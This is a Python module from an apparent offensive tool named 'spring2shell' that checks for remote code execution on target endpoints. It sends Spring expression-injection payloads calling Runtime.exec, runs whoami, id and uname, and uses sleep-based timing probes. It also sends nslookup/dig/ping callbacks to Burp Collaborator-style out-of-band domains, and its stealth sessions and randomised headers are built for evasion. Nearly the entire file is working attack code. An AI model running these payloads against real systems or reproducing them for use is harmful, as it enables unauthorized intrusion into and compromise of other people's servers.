"""
RCE verification module for spring2shell.

Provides:
- check_real_rce():        echo-marker + output-indicator verification
- blind_rce_test():        time-delay test + DNS callback (OAST/Collaborator)
- _strict_verify_execution(): 2-marker replay with baseline control (internal)
"""

from __future__ import annotations

import hashlib
import logging
import re
import time
import random

import requests

from spring2shell.core.session import create_stealth_session
from spring2shell.evasion.headers import get_random_headers
from spring2shell.utils.logging import log_event, log_swallowed_exception
from spring2shell.utils.network import ssl_verify


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _escape_java_string(value: str) -> str:
    return value.replace("\\", "\\\\").replace('"', '\\"')


def _build_payload_from_template(payload_template: str | None, command: str) -> str | None:
    """Replace COMMAND placeholder or patch existing exec() call in *payload_template*."""
    if not payload_template or payload_template == "N/A":
        return None
    escaped = _escape_java_string(command)
    try:
        if "COMMAND" in payload_template:
            return payload_template.replace("COMMAND", escaped)
        pattern = r'exec\\\(\\\"([^\\\"]*)\\\"\\\)'
        match = re.search(pattern, payload_template)
        if match:
            old_cmd = match.group(1)
            return payload_template.replace(old_cmd, escaped)
    except Exception:
        return None
    return None


def _send_payload_request(
    session: requests.Session,
    endpoint: str,
    method: str,
    headers: dict[str, str],
    payload: str,
    timeout: int = 8,
) -> requests.Response:
    if method.upper() == "GET":
        import urllib.parse
        return session.get(
            endpoint, params={"query": urllib.parse.quote(payload)},
            headers=headers, timeout=timeout,
        )
    if "Content-Type" not in headers:
        headers["Content-Type"] = "application/json"
    return session.post(endpoint, data=payload, headers=headers, timeout=timeout)


# ---------------------------------------------------------------------------
# Strict verification (internal — used by exploit_vulnerability)
# ---------------------------------------------------------------------------

def _strict_verify_execution(
    session: requests.Session,
    endpoint: str,
    method: str,
    headers: dict[str, str],
    timeout: int = 8,
    payload_template: str | None = None,
) -> bool:
    """2-marker replay + baseline control.

    Sends a neutral baseline query first, then sends payloads containing two
    distinct random markers.  Returns True only when BOTH markers appear in
    their respective responses and are absent from the baseline.

    Args:
        session:          Active requests.Session.
        endpoint:         Full URL of the target endpoint.
        method:           HTTP method ('POST' or 'GET').
        headers:          Request headers (copied internally).
        timeout:          Per-request timeout in seconds.
        payload_template: Optional payload template from earlier scan finding.

    Returns:
        True if both markers confirmed, False otherwise.
    """
    baseline_payload = '{"query": "query { __typename }"}'
    try:
        baseline_resp = _send_payload_request(
            session, endpoint, method, headers.copy(), baseline_payload, timeout
        )
        baseline_text = baseline_resp.text
    except Exception:
        baseline_text = ""

    markers = [f"RCE_STRICT_{random.randint(10000, 99999)}" for _ in range(2)]
    confirmed = 0
    for marker in markers:
        attempt_command = f"echo {marker}"
        payload = _build_payload_from_template(payload_template, attempt_command)
        if not payload:
            escaped = _escape_java_string(attempt_command)
            payload = f'{{"query": "{{{{T(java.lang.Runtime).getRuntime().exec(\\"{escaped}\\")}}}}"  }}'
        try:
            resp = _send_payload_request(
                session, endpoint, method, headers.copy(), payload, timeout
            )
            if marker in resp.text and marker not in baseline_text:
                confirmed += 1
        except Exception:
            continue

    return confirmed >= 2


# ---------------------------------------------------------------------------
# Public verification API
# ---------------------------------------------------------------------------

def check_real_rce(
    target_url: str,
    endpoint: str,
    method: str = "POST",
) -> bool:
    """Verify RCE using an echo-marker test followed by known-output indicators.

    Test 1: sends ``echo <UNIQUE_MARKER>`` — looks for the marker in the response.
    Test 2: tries whoami/id/pwd/uname and checks expected output patterns.

    Args:
        target_url: Base target URL (used for logging only).
        endpoint:   Full URL of the endpoint to probe.
        method:     HTTP method to use.

    Returns:
        True if RCE is confirmed by the echo-marker test.
    """
    log_event(logging.INFO, "check_real_rce start", target=target_url, endpoint=endpoint)
    session = create_stealth_session()
    headers = get_random_headers()

    unique_marker = f"RCE_TEST_{random.randint(10000, 99999)}"
    log_event(logging.INFO, f"Test 1: echo marker '{unique_marker}'")

    cmd = f"echo {unique_marker}"
    payload = f'{{"query": "{{{{T(java.lang.Runtime).getRuntime().exec(\\"{cmd}\\")}}}}"}}'

    try:
        if method.upper() == "GET":
            import urllib.parse
            response = session.get(endpoint, params={"query": payload}, headers=headers)
        else:
            headers["Content-Type"] = "application/json"
            response = session.post(endpoint, data=payload, headers=headers)

        if unique_marker in response.text:
            log_event(logging.WARNING, "REAL RCE CONFIRMED (echo-marker)", marker=unique_marker)
            return True
        else:
            log_event(logging.INFO, "Echo marker not found in response")
    except Exception as exc:
        log_swallowed_exception("check_real_rce test1", exc)

    # Test 2: known-output indicators
    log_event(logging.INFO, "Test 2: known-output indicators")
    test_commands: list[tuple[str, list[str]]] = [
        ("whoami", ["root", "admin", "user", "apache", "nginx", "www-data"]),
        ("id",     ["uid=", "gid=", "groups="]),
        ("pwd",    ["/", "home/", "var/", "usr/"]),
        ("uname -a", ["Linux", "Darwin", "Windows", "kernel"]),
    ]
    for test_cmd, indicators in test_commands:
        p = f'{{"query": "{{{{T(java.lang.Runtime).getRuntime().exec(\\"{test_cmd}\\")}}}}"}}'
        try:
            if method.upper() == "GET":
                import urllib.parse
                r = session.get(endpoint, params={"query": p}, headers=headers, timeout=5)
            else:
                r = session.post(endpoint, data=p, headers=headers, timeout=5)
            for indicator in indicators:
                if indicator.lower() in r.text.lower():
                    log_event(logging.INFO, f"Known-output indicator '{indicator}' found for '{test_cmd}'")
        except Exception:
            continue
        time.sleep(0.5)

    return False


def blind_rce_test(
    target_url: str,
    endpoint: str,
    method: str = "POST",
) -> bool:
    """Test for blind RCE using time-delay measurement and DNS callback probes.

    Test 1: Measures baseline response time, then sends ``sleep 3`` variants
            and compares timing.  A delta > 2 s is treated as a positive signal.

    Test 2: Sends nslookup/dig/ping to an OAST domain (Burp Collaborator style).
            The user must check their OOB server for callbacks.

    Args:
        target_url: Base target URL (used for logging only).
        endpoint:   Full URL of the endpoint to probe.
        method:     HTTP method to use.

    Returns:
        True if time-delay test indicates blind RCE.
    """
    log_event(logging.INFO, "blind_rce_test start", target=target_url)
    session = create_stealth_session()
    headers = get_random_headers()

    # ── Test 1: time-delay ───────────────────────────────────────────────────
    log_event(logging.INFO, "Blind RCE Test 1: time-delay (sleep 3)")
    baseline_payload = '{"query": "test"}'
    try:
        t0 = time.time()
        if method.upper() == "GET":
            import urllib.parse
            session.get(endpoint, params={"query": baseline_payload}, headers=headers, timeout=5)
        else:
            headers["Content-Type"] = "application/json"
            session.post(endpoint, data=baseline_payload, headers=headers, timeout=5)
        baseline_time = time.time() - t0
    except Exception:
        baseline_time = 1.0

    sleep_commands = ["sleep 3", "ping -c 3 127.0.0.1", "timeout 3 sleep 1"]
    for sleep_cmd in sleep_commands:
        escaped = _escape_java_string(sleep_cmd)
        payload = f'{{"query": "{{{{T(java.lang.Runtime).getRuntime().exec(\\"{escaped}\\")}}}}"}}'
        try:
            t0 = time.time()
            if method.upper() == "GET":
                import urllib.parse
                session.get(endpoint, params={"query": payload}, headers=headers, timeout=10)
            else:
                session.post(endpoint, data=payload, headers=headers, timeout=10)
            elapsed = time.time() - t0
            if elapsed > baseline_time + 2.0:
                log_event(logging.WARNING,
                          f"POSSIBLE BLIND RCE (time-delay): {elapsed:.2f}s vs baseline {baseline_time:.2f}s")
                return True
        except requests.exceptions.Timeout:
            log_event(logging.WARNING, "POSSIBLE BLIND RCE: request timed out (sleep may have executed)")
            return True
        except Exception as exc:
            log_swallowed_exception(f"blind_rce sleep_cmd={sleep_cmd}", exc)

    # ── Test 2: DNS callback (OOB) ───────────────────────────────────────────
    log_event(logging.INFO, "Blind RCE Test 2: DNS callback (OOB)")
    random_token = hashlib.md5(str(time.time()).encode()).hexdigest()[:8]
    oast_domains = [
        f"{random_token}.oastify.com",
        f"{random_token}.burpcollaborator.net",
    ]
    for domain in oast_domains:
        dns_cmd = f"nslookup {domain} || dig {domain} || ping -c 1 {domain}"
        escaped = _escape_java_string(dns_cmd)
        payload = f'{{"query": "{{{{T(java.lang.Runtime).getRuntime().exec(\\"{escaped}\\")}}}}"}}'
        try:
            if method.upper() == "GET":
                import urllib.parse
                session.get(endpoint, params={"query": payload}, headers=headers, timeout=5)
            else:
                session.post(endpoint, data=payload, headers=headers, timeout=5)
            log_event(logging.INFO,
                      f"DNS callback request sent to {domain} — check your OOB server")
            time.sleep(2)
        except Exception as exc:
            log_swallowed_exception(f"blind_rce DNS {domain}", exc)

    return False
